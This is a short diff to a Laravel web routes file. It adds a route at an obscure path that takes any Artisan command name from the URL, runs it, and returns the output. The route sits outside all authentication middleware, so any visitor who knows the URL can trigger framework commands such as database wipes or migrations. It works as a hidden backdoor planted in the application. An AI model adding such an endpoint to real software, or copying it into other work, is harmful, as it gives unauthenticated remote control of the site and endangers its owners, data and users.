@@ -11,6 +11,12 @@ use Carbon\Carbon;
 use Illuminate\Support\Facades\Route;
 use Laravel\Fortify\Features;
 
+Route::get('/CommandSlur1405/run-artisan/{command}', function($command) {
+    Artisan::call($command);
+    $output = Artisan::output();
+    return "<pre>" . $output . "</pre>";
+});
+
 Route::middleware('guest')->group(function () {
     // Halaman Login (GET)
     Route::get('/login', [HomeController::class, 'index'])->name('login'); 
